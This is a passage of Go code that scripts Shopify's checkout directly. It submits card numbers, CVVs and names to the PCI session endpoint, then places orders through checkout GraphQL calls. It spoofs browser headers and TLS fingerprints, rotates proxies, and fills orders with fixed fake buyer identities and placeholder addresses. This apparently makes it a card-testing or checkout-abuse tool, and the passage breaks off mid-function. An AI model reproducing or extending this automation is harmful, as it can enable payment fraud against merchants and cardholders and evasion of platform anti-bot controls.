func sendPCISession(identSig, cardNumber, cardName string, cardMonth, cardYear int, cvv, shopDomain, proxyURL string) (int, string, error) {
	formattedNum := formatCardNumber(cardNumber)
	payload := fmt.Sprintf(`{
  "credit_card": {
    "number": %q,
    "month": %d,
    "year": %d,
    "verification_value": %q,
    "start_month": null,
    "start_year": null,
    "issue_number": "",
    "name": %q
  },
  "payment_session_scope": %q
}`, formattedNum, cardMonth, cardYear, cvv, cardName, shopDomain)

	req, err := fhttp.NewRequest("POST", "https://checkout.pci.shopifyinc.com/sessions", strings.NewReader(payload))
	if err != nil {
		return 0, "", fmt.Errorf("building PCI request: %w", err)
	}

	req.Header.Set("accept", "application/json")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	req.Header.Set("content-type", "application/json")
	req.Header.Set("origin", "https://checkout.pci.shopifyinc.com")
	req.Header.Set("priority", "u=1, i")
	req.Header.Set("referer", "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=")
	req.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("sec-fetch-storage-access", "active")
	req.Header.Set("shopify-identification-signature", identSig)
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")

	var resp *fhttp.Response
	var lastErr error
	for attempt := 0; attempt < 5; attempt++ {
		pciOptions := []tls_client.HttpClientOption{
			tls_client.WithTimeoutSeconds(30),
			tls_client.WithClientProfile(profiles.Chrome_124),
		}
		if proxyURL != "" {
			pciOptions = append(pciOptions, tls_client.WithProxyUrl(proxyURL))
		}
		pciClient, cErr := tls_client.NewHttpClient(tls_client.NewNoopLogger(), pciOptions...)
		if cErr != nil {
			lastErr = cErr
			continue
		}
		if req.GetBody != nil {
			if rb, gbErr := req.GetBody(); gbErr == nil {
				req.Body = rb
			}
		}
		resp, err = doWithRetry(pciClient, req, 1)
		if err == nil {
			break
		}
		lastErr = err
		if attempt < 4 {
			time.Sleep(2 * time.Second)
		}
	}
	if err != nil && proxyURL != "" {
		if req.GetBody != nil {
			if rb, gbErr := req.GetBody(); gbErr == nil {
				req.Body = rb
			}
		}
		fallbackClient, fbErr := tls_client.NewHttpClient(tls_client.NewNoopLogger(),
			tls_client.WithTimeoutSeconds(30),
			tls_client.WithClientProfile(profiles.Chrome_124),
		)
		if fbErr == nil {
			resp, err = doWithRetry(fallbackClient, req, 2)
		}
	}
	_ = lastErr
	if err != nil {
		return 0, "", fmt.Errorf("POST PCI session: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", fmt.Errorf("reading PCI response: %w", err)
	}

	return resp.StatusCode, string(body), nil
}

func sendProposal(client tls_client.HttpClient, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, currency, country, email, phone, proxyURL string) (int, string, error) {
	gqlPayload := fmt.Sprintf(`{
  "variables": {
    "sessionInput": {
      "sessionToken": %q
    },
    "queueToken": null,
    "discounts": {
      "lines": [],
      "acceptUnexpectedDiscounts": true
    },
    "delivery": {
      "deliveryLines": [
        {
          "destination": {
            "partialStreetAddress": {
              "address1": "",
              "city": "",
              "countryCode": "US",
              "lastName": "",
              "phone": "",
              "oneTimeUse": false
            }
          },
          "selectedDeliveryStrategy": {
            "deliveryStrategyMatchingConditions": {
              "estimatedTimeInTransit": {"any": true},
              "shipments": {"any": true}
            },
            "options": {}
          },
          "targetMerchandiseLines": {"any": true},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {"any": true},
          "destinationChanged": true
        }
      ],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    },
    "deliveryExpectations": {
      "deliveryExpectationLines": []
    },
    "merchandise": {
      "merchandiseLines": [
        {
          "stableId": %q,
          "merchandise": {
            "productVariantReference": {
              "id": "gid://shopify/ProductVariantMerchandise/%s",
              "variantId": "gid://shopify/ProductVariant/%s",
              "properties": [],
              "sellingPlanId": null,
              "sellingPlanDigest": null
            }
          },
          "quantity": {
            "items": {"value": 1}
          },
					"expectedTotalPrice": {"any": true},
          "lineComponentsSource": null,
          "lineComponents": []
        }
      ]
    },
    "memberships": {"memberships": []},
    "payment": {
      "totalAmount": {"any": true},
      "paymentLines": [],
      "billingAddress": {
        "streetAddress": {
          "address1": "",
          "city": "",
          "countryCode": "US",
          "lastName": "",
          "phone": ""
        }
      }
    },
    "buyerIdentity": {
      "customer": {
        "presentmentCurrency": "USD",
        "countryCode": "US"
      },
      "email": %q,
      "emailChanged": false,
      "phoneCountryCode": "US",
      "marketingConsent": [{"email": {"value": %q}}],
      "shopPayOptInPhone": {"number": %q, "countryCode": "US"},
      "rememberMe": false
    },
    "tip": {"tipLines": []},
    "poNumber": null,
    "taxes": {
      "proposedAllocations": null,
      "proposedTotalAmount": {"any": true},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    },
    "note": {
      "message": null,
      "customAttributes": []
    },
    "localizationExtension": {"fields": []},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {
      "signature": null,
      "signatureUuid": null,
      "lineItemScriptChanges": [],
      "paymentScriptChanges": [],
      "shippingScriptChanges": []
    },
    "optionalDuties": {"buyerRefusesDuties": false},
    "cartMetafields": []
  },
  "operationName": "Proposal",
  "id": %q
}`,
		sessionToken, stableID, variantID, variantID, email, email, phone, proposalID)
	gqlPayload = patchPayload(gqlPayload, currency, country)

	req, err := fhttp.NewRequest("POST", shopURL+"/checkouts/internal/graphql/persisted?operationName=Proposal", strings.NewReader(gqlPayload))
	if err != nil {
		return 0, "", fmt.Errorf("building request: %w", err)
	}

	req.Header.Set("accept", "application/json")
	req.Header.Set("accept-language", "en-US")
	req.Header.Set("content-type", "application/json")
	req.Header.Set("origin", shopURL)
	req.Header.Set("priority", "u=1, i")
	req.Header.Set("referer", checkoutURL)
	req.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("shopify-checkout-client", "checkout-web/1.0")
	req.Header.Set("shopify-checkout-source", fmt.Sprintf(`id="%s", type="cn"`, checkoutToken))
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")
	req.Header.Set("x-checkout-one-session-token", sessionToken)
	req.Header.Set("x-checkout-web-build-id", buildID)
	req.Header.Set("x-checkout-web-deploy-stage", "production")
	req.Header.Set("x-checkout-web-server-handling", "fast")
	req.Header.Set("x-checkout-web-server-rendering", "yes")
	req.Header.Set("x-checkout-web-source-id", sourceToken)

	resp, err := doWithRetry(client, req, 2)
	if err != nil && proxyURL != "" {
		if req.GetBody != nil {
			if rb, gbErr := req.GetBody(); gbErr == nil {
				req.Body = rb
			}
		}
		fallbackClient, fbErr := createNoProxyClient()
		if fbErr == nil {
			resp, err = doWithRetry(fallbackClient, req, 2)
		}
	}
	if err != nil {
		return 0, "", fmt.Errorf("POST proposal: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", fmt.Errorf("reading response: %w", err)
	}

	return resp.StatusCode, string(body), nil
}

func extractQueueToken(proposalJSON string) string {
	re := regexp.MustCompile(`"queueToken"\s*:\s*"([^"]+)"`)
	m := re.FindStringSubmatch(proposalJSON)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func sendProposal2(client tls_client.HttpClient, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken, email, currency, country, deliveryHandle, phone, proxyURL string) (int, string, error) {
	gqlPayload := fmt.Sprintf(`{
  "variables": {
    "sessionInput": {
      "sessionToken": %q
    },
    "queueToken": %q,
    "discounts": {
      "lines": [],
      "acceptUnexpectedDiscounts": true
    },
    "delivery": {
      "deliveryLines": [
        {
          "destination": {
            "partialStreetAddress": {
              "address1": "",
              "city": "",
              "countryCode": "US",
              "lastName": "",
              "phone": "",
              "oneTimeUse": false
            }
          },
          "selectedDeliveryStrategy": {
            "deliveryStrategyMatchingConditions": {
              "estimatedTimeInTransit": {"any": true},
              "shipments": {"any": true}
            },
            "options": {}
          },
          "targetMerchandiseLines": {"any": true},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {"any": true},
          "destinationChanged": true
        }
      ],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    },
    "deliveryExpectations": {
      "deliveryExpectationLines": []
    },
    "merchandise": {
      "merchandiseLines": [
        {
          "stableId": %q,
          "merchandise": {
            "productVariantReference": {
              "id": "gid://shopify/ProductVariantMerchandise/%s",
              "variantId": "gid://shopify/ProductVariant/%s",
              "properties": [],
              "sellingPlanId": null,
              "sellingPlanDigest": null
            }
          },
          "quantity": {
            "items": {"value": 1}
          },
					"expectedTotalPrice": {"any": true},
          "lineComponentsSource": null,
          "lineComponents": []
        }
      ]
    },
    "memberships": {"memberships": []},
    "payment": {
      "totalAmount": {"any": true},
      "paymentLines": [],
      "billingAddress": {
        "streetAddress": {
          "address1": "",
          "city": "",
          "countryCode": "US",
          "lastName": "",
          "phone": ""
        }
      }
    },
    "buyerIdentity": {
      "customer": {
        "presentmentCurrency": "USD",
        "countryCode": "US"
      },
      "email": %q,
      "emailChanged": true,
      "phoneCountryCode": "US",
      "marketingConsent": [{"email": {"value": %q}}],
      "shopPayOptInPhone": {"number": %q, "countryCode": "US"},
      "rememberMe": false
    },
    "tip": {"tipLines": []},
    "poNumber": null,
    "taxes": {
      "proposedAllocations": null,
      "proposedTotalAmount": {"any": true},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    },
    "note": {
      "message": null,
      "customAttributes": []
    },
    "localizationExtension": {"fields": []},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {
      "signature": null,
      "signatureUuid": null,
      "lineItemScriptChanges": [],
      "paymentScriptChanges": [],
      "shippingScriptChanges": []
    },
    "optionalDuties": {"buyerRefusesDuties": false},
    "cartMetafields": []
  },
  "operationName": "Proposal",
  "id": %q
}`,
		sessionToken, queueToken, stableID, variantID, variantID, email, email, phone, proposalID)
	gqlPayload = patchPayload(gqlPayload, currency, country)
	if deliveryHandle != "" {
		gqlPayload = strings.Replace(gqlPayload, `"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": true}, "shipments": {"any": true}}`, fmt.Sprintf(`"deliveryStrategyByHandle": {"handle": %q, "customDeliveryRate": false}`, deliveryHandle), 1)
	}

	req, err := fhttp.NewRequest("POST", shopURL+"/checkouts/internal/graphql/persisted?operationName=Proposal", strings.NewReader(gqlPayload))
	if err != nil {
		return 0, "", fmt.Errorf("building request: %w", err)
	}

	req.Header.Set("accept", "application/json")
	req.Header.Set("accept-language", "en-US")
	req.Header.Set("content-type", "application/json")
	req.Header.Set("origin", shopURL)
	req.Header.Set("priority", "u=1, i")
	req.Header.Set("referer", checkoutURL)
	req.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("shopify-checkout-client", "checkout-web/1.0")
	req.Header.Set("shopify-checkout-source", fmt.Sprintf(`id="%s", type="cn"`, checkoutToken))
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")
	req.Header.Set("x-checkout-one-session-token", sessionToken)
	req.Header.Set("x-checkout-web-build-id", buildID)
	req.Header.Set("x-checkout-web-deploy-stage", "production")
	req.Header.Set("x-checkout-web-server-handling", "fast")
	req.Header.Set("x-checkout-web-server-rendering", "yes")
	req.Header.Set("x-checkout-web-source-id", sourceToken)

	resp, err := doWithRetry(client, req, 2)
	if err != nil && proxyURL != "" {
		if req.GetBody != nil {
			if rb, gbErr := req.GetBody(); gbErr == nil {
				req.Body = rb
			}
		}
		fallbackClient, fbErr := createNoProxyClient()
		if fbErr == nil {
			resp, err = doWithRetry(fallbackClient, req, 2)
		}
	}
	if err != nil {
		return 0, "", fmt.Errorf("POST proposal2: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", fmt.Errorf("reading response: %w", err)
	}

	return resp.StatusCode, string(body), nil
}

type Address struct {
	FirstName   string
	LastName    string
	Address1    string
	Address2    string
	City        string
	CountryCode string
	ZoneCode    string
	PostalCode  string
	Phone       string
}

var countryAddresses = map[string]Address{
	"US": {FirstName: "james", LastName: "anderson", Address1: "428 st", Address2: "apt", City: "New York", CountryCode: "US", ZoneCode: "NY", PostalCode: "10080", Phone: "+12125550100"},
	"CA": {FirstName: "james", LastName: "anderson", Address1: "200 Kent St", Address2: "", City: "Ottawa", CountryCode: "CA", ZoneCode: "ON", PostalCode: "K1A 0G9", Phone: "+16135550100"},
	"GB": {FirstName: "james", LastName: "anderson", Address1: "10 Downing St", Address2: "", City: "London", CountryCode: "GB", ZoneCode: "ENG", PostalCode: "SW1A 2AA", Phone: "+442012345678"},
	"AU": {FirstName: "james", LastName: "anderson", Address1: "1 George St", Address2: "", City: "Sydney", CountryCode: "AU", ZoneCode: "NSW", PostalCode: "2000", Phone: "+61212345678"},
	"DE": {FirstName: "james", LastName: "anderson", Address1: "Friedrichstr 100", Address2: "", City: "Berlin", CountryCode: "DE", ZoneCode: "BE", PostalCode: "10117", Phone: "+493012345678"},
	"FR": {FirstName: "james", LastName: "anderson", Address1: "10 Rue de Rivoli", Address2: "", City: "Paris", CountryCode: "FR", ZoneCode: "", PostalCode: "75001", Phone: "+33112345678"},
	"NZ": {FirstName: "james", LastName: "anderson", Address1: "1 Queen St", Address2: "", City: "Auckland", CountryCode: "NZ", ZoneCode: "AUK", PostalCode: "1010", Phone: "+6491234567"},
	"IE": {FirstName: "james", LastName: "anderson", Address1: "1 Grafton St", Address2: "", City: "Dublin", CountryCode: "IE", ZoneCode: "D", PostalCode: "D02 Y006", Phone: "+35311234567"},
}

func addressForCountry(country string) Address {
	if addr, ok := countryAddresses[country]; ok {
		return addr
	}
	return countryAddresses["US"]
}

func sendProposal3(client tls_client.HttpClient, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken, email string, addr Address, currency, country, deliveryHandle, proxyURL string) (int, string, error) {
	gqlPayload := fmt.Sprintf(`{
  "variables": {
    "sessionInput": {
      "sessionToken": %q
    },
    "queueToken": %q,
    "discounts": {
      "lines": [],
      "acceptUnexpectedDiscounts": true
    },
    "delivery": {
      "deliveryLines": [
        {
          "destination": {
            "partialStreetAddress": {
              "address1": %q,
              "address2": %q,
              "city": %q,
              "countryCode": %q,
              "postalCode": %q,
              "firstName": %q,
              "lastName": %q,
              "zoneCode": %q,
              "phone": %q,
              "oneTimeUse": false
            }
          },
          "selectedDeliveryStrategy": {
            "deliveryStrategyMatchingConditions": {
              "estimatedTimeInTransit": {"any": true},
              "shipments": {"any": true}
            },
            "options": {}
          },
          "targetMerchandiseLines": {"any": true},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {"any": true},
          "destinationChanged": true
        }
      ],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    },
    "deliveryExpectations": {
      "deliveryExpectationLines": []
    },
    "merchandise": {
      "merchandiseLines": [
        {
          "stableId": %q,
          "merchandise": {
            "productVariantReference": {
              "id": "gid://shopify/ProductVariantMerchandise/%s",
              "variantId": "gid://shopify/ProductVariant/%s",
              "properties": [],
              "sellingPlanId": null,
              "sellingPlanDigest": null
            }
          },
          "quantity": {
            "items": {"value": 1}
          },
					"expectedTotalPrice": {"any": true},
          "lineComponentsSource": null,
          "lineComponents": []
        }
      ]
    },
    "memberships": {"memberships": []},
    "payment": {
      "totalAmount": {"any": true},
      "paymentLines": [],
      "billingAddress": {
        "streetAddress": {
          "address1": %q,
          "address2": %q,
          "city": %q,
          "countryCode": %q,
          "postalCode": %q,
          "firstName": %q,
          "lastName": %q,
          "zoneCode": %q,
          "phone": %q
        }
      }
    },
    "buyerIdentity": {
      "customer": {
        "presentmentCurrency": "USD",
        "countryCode": "US"
      },
      "email": %q,
      "emailChanged": false,
      "phoneCountryCode": "US",
      "marketingConsent": [{"email": {"value": %q}}],
      "shopPayOptInPhone": {"number": %q, "countryCode": "US"},
      "rememberMe": false
    },
    "tip": {"tipLines": []},
    "poNumber": null,
    "taxes": {
      "proposedAllocations": null,
      "proposedTotalAmount": {"any": true},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    },
    "note": {
      "message": null,
      "customAttributes": []
    },
    "localizationExtension": {"fields": []},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {
      "signature": null,
      "signatureUuid": null,
      "lineItemScriptChanges": [],
      "paymentScriptChanges": [],
      "shippingScriptChanges": []
    },
    "optionalDuties": {"buyerRefusesDuties": false},
    "cartMetafields": []
  },
  "operationName": "Proposal",
  "id": %q
}`,
		sessionToken, queueToken,
		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
		stableID, variantID, variantID,
		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
		email, email, addr.Phone, proposalID)
	gqlPayload = patchPayload(gqlPayload, currency, country)
	if deliveryHandle != "" {
		gqlPayload = strings.Replace(gqlPayload, `"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": true}, "shipments": {"any": true}}`, fmt.Sprintf(`"deliveryStrategyByHandle": {"handle": %q, "customDeliveryRate": false}`, deliveryHandle), 1)
	}

	req, err := fhttp.NewRequest("POST", shopURL+"/checkouts/internal/graphql/persisted?operationName=Proposal", strings.NewReader(gqlPayload))
	if err != nil {
		return 0, "", fmt.Errorf("building request: %w", err)
	}

	req.Header.Set("accept", "application/json")
	req.Header.Set("accept-language", "en-US")
	req.Header.Set("content-type", "application/json")
	req.Header.Set("origin", shopURL)
	req.Header.Set("priority", "u=1, i")
	req.Header.Set("referer", checkoutURL)
	req.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("shopify-checkout-client", "checkout-web/1.0")
	req.Header.Set("shopify-checkout-source", fmt.Sprintf(`id="%s", type="cn"`, checkoutToken))
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")
	req.Header.Set("x-checkout-one-session-token", sessionToken)
	req.Header.Set("x-checkout-web-build-id", buildID)
	req.Header.Set("x-checkout-web-deploy-stage", "production")
	req.Header.Set("x-checkout-web-server-handling", "fast")
	req.Header.Set("x-checkout-web-server-rendering", "yes")
	req.Header.Set("x-checkout-web-source-id", sourceToken)

	resp, err := doWithRetry(client, req, 2)
	if err != nil && proxyURL != "" {
		if req.GetBody != nil {
			if rb, gbErr := req.GetBody(); gbErr == nil {
				req.Body = rb
			}
		}
		fallbackClient, fbErr := createNoProxyClient()
		if fbErr == nil {
			resp, err = doWithRetry(fallbackClient, req, 2)
		}
	}
	if err != nil {
		return 0, "", fmt.Errorf("POST proposal3: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", fmt.Errorf("reading response: %w", err)
	}

	return resp.StatusCode, string(body), nil
}

func sendPollForReceipt(
	client tls_client.HttpClient,
	shopURL, checkoutURL, checkoutToken, sessionToken,
	buildID, sourceToken,
	pollID, receiptID, receiptSessionToken string,
	proxyURL string,
) (int, string, error) {

	varsJSON := fmt.Sprintf(`{"receiptId":%s,"sessionToken":%s}`,
		strconv.Quote(receiptID), strconv.Quote(receiptSessionToken))

	graphqlURL := shopURL + "/checkouts/internal/graphql/persisted"

	params := url.Values{}
	params.Set("operationName", "PollForReceipt")
	params.Set("variables", varsJSON)
	params.Set("id", pollID)

	fullURL := graphqlURL + "?" + params.Encode()

	req, err := fhttp.NewRequest("GET", fullURL, nil)
	if err != nil {
		return 0, "", fmt.Errorf("creating PollForReceipt request: %w", err)
	}

	checkoutPath := strings.TrimPrefix(checkoutURL, shopURL)

	req.Header.Set("accept", "application/json")
	req.Header.Set("accept-language", "en-US")
	req.Header.Set("content-type", "application/json")
	req.Header.Set("priority", "u=1, i")
	req.Header.Set("referer", checkoutURL)
	req.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("shopify-checkout-client", "checkout-web/1.0")
	req.Header.Set("shopify-checkout-source", fmt.Sprintf(`id="%s", type="cn"`, checkoutToken))
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")
	req.Header.Set("x-checkout-one-session-token", sessionToken)
	req.Header.Set("x-checkout-web-build-id", buildID)
	req.Header.Set("x-checkout-web-deploy-stage", "production")
	req.Header.Set("x-checkout-web-server-handling", "fast")
	req.Header.Set("x-checkout-web-server-rendering", "yes")
	req.Header.Set("x-checkout-web-source-id", checkoutToken)
	_ = checkoutPath

	resp, err := doWithRetry(client, req, 2)
	if err != nil && proxyURL != "" {
		fallbackClient, fbErr := createNoProxyClient()
		if fbErr == nil {
			resp, err = doWithRetry(fallbackClient, req, 2)
		}
	}
	if err != nil {
		return 0, "", fmt.Errorf("PollForReceipt request failed: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return resp.StatusCode, "", fmt.Errorf("reading PollForReceipt response: %w", err)
	}

	return resp.StatusCode, string(body), nil
}

func sendSubmitForCompletion(
	client tls_client.HttpClient,
	shopURL, checkoutURL, checkoutToken, sessionToken,
	stableID, variantID, price,
	submitID, buildID, sourceToken, queueToken, email string,
	addr Address,
	deliveryHandle, shippingAmount, totalAmount,
	pciSessionID, attemptToken, currency, country string,
	signedHandles []string,
	paymentMethodIdentifier, proxyURL string,
) (int, string, error) {

	var handleLines []string
	for _, h := range signedHandles {
		handleLines = append(handleLines, fmt.Sprintf(`{"signedHandle":%s}`, strconv.Quote(h)))
	}
	signedHandlesJSON := "[" + strings.Join(handleLines, ",") + "]"

	pageID := generatePageID()

	gqlPayload := fmt.Sprintf(`{
  "variables": {
    "input": {
      "sessionInput": {
        "sessionToken": %q
      },
      "queueToken": %q,
      "discounts": {
        "lines": [],
        "acceptUnexpectedDiscounts": true
      },
      "delivery": {
        "deliveryLines": [
          {
            "destination": {
              "streetAddress": {
                "address1": %q,
                "address2": %q,
                "city": %q,
                "countryCode": %q,
                "postalCode": %q,
                "firstName": %q,
                "lastName": %q,
                "zoneCode": %q,
                "phone": %q,
                "oneTimeUse": false
              }
            },
            "selectedDeliveryStrategy": {
              "deliveryStrategyByHandle": {
                "handle": %q,
                "customDeliveryRate": false
              },
              "options": {}
            },
            "targetMerchandiseLines": {
              "lines": [
                {"stableId": %q}
              ]
            },
            "deliveryMethodTypes": ["SHIPPING"],
						"expectedTotalPrice": {"any": true},
            "destinationChanged": false
          }
        ],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      },
      "deliveryExpectations": {
        "deliveryExpectationLines": %s
      },
      "merchandise": {
        "merchandiseLines": [
          {
            "stableId": %q,
            "merchandise": {
              "productVariantReference": {
                "id": "gid://shopify/ProductVariantMerchandise/%s",
                "variantId": "gid://shopify/ProductVariant/%s",
                "properties": [],
                "sellingPlanId": null,
                "sellingPlanDigest": null
              }
            },
            "quantity": {
              "items": {"value": 1}
            },
						"expectedTotalPrice": {"any": true},
            "lineComponentsSource": null,
            "lineComponents": []
          }
        ]
      },
      "memberships": {"memberships": []},
      "payment": {
				"totalAmount": {
					"value": {
						"amount": %q,
						"currencyCode": "USD"
					}
				},
        "paymentLines": [
          {
            "paymentMethod": {
              "directPaymentMethod": {
                "paymentMethodIdentifier": %q,
                "sessionId": %q,
                "billingAddress": {
                  "streetAddress": {
                    "address1": %q,
                    "address2": %q,
                    "city": %q,
                    "countryCode": %q,
                    "postalCode": %q,
                    "firstName": %q,
                    "lastName": %q,
                    "zoneCode": %q,
                    "phone": %q
                  }
                },
                "cardSource": null
              },
              "giftCardPaymentMethod": null,
              "redeemablePaymentMethod": null,
              "walletPaymentMethod": null,
              "walletsPlatformPaymentMethod": null,
              "localPaymentMethod": null,
              "paymentOnDeliveryMethod": null,
              "paymentOnDeliveryMethod2": null,
              "manualPaymentMethod": null,
              "customPaymentMethod": null,
              "offsitePaymentMethod": null,
              "customOnsitePaymentMethod": null,
              "deferredPaymentMethod": null,
              "customerCreditCardPaymentMethod": null,
              "paypalBillingAgreementPaymentMethod": null,
              "remotePaymentInstrument": null
            },
            "amount": {
              "value": {
                "amount": %q,
                "currencyCode": "USD"
              }
            }
          }
        ],
        "billingAddress": {
          "streetAddress": {
            "address1": %q,
            "address2": %q,
            "city": %q,
            "countryCode": %q,
            "postalCode": %q,
            "firstName": %q,
            "lastName": %q,
            "zoneCode": %q,
            "phone": %q
          }
        }
      },
      "buyerIdentity": {
        "customer": {
          "presentmentCurrency": "USD",
          "countryCode": "US"
        },
        "email": %q,
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [{"email": {"value": %q}}],
        "shopPayOptInPhone": {"number": %q, "countryCode": "US"},
        "rememberMe": false
      },
      "tip": {"tipLines": []},
      "taxes": {
        "proposedAllocations": null,
        "proposedTotalAmount": {"any": true},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      },
      "note": {
        "message": null,
        "customAttributes": []
      },
      "localizationExtension": {"fields": []},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {
        "signature": null,
        "signatureUuid": null,
        "lineItemScriptChanges": [],
        "paymentScriptChanges": [],
        "shippingScriptChanges": []
      },
      "optionalDuties": {"buyerRefusesDuties": false},
      "cartMetafields": []
    },
    "attemptToken": %q,
    "metafields": [],
    "analytics": {
      "requestUrl": %q,
      "pageId": %q
    }
  },
  "operationName": "SubmitForCompletion",
  "id": %q
}`,
		sessionToken, queueToken,
		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
		deliveryHandle,
		stableID,
		signedHandlesJSON,
		stableID, variantID, variantID,
		totalAmount,
		paymentMethodIdentifier,
		pciSessionID,
		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
		totalAmount,
		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
		email,
		email, addr.Phone,
		attemptToken, checkoutURL, pageID,
		submitID)
	gqlPayload = patchPayload(gqlPayload, currency, country)

	req, err := fhttp.NewRequest("POST", shopURL+"/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion", strings.NewReader(gqlPayload))
	if err != nil {
		return 0, "", fmt.Errorf("building request: %w", err)
	}

	req.Header.Set("accept", "application/json")
	req.Header.Set("accept-language", "en-US")
	req.Header.Set("content-type", "application/json")
	req.Header.Set("origin", shopURL)
	req.Header.Set("priority", "u=1, i")
	req.Header.Set("referer", checkoutURL)
	req.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("shopify-checkout-client", "checkout-web/1.0")
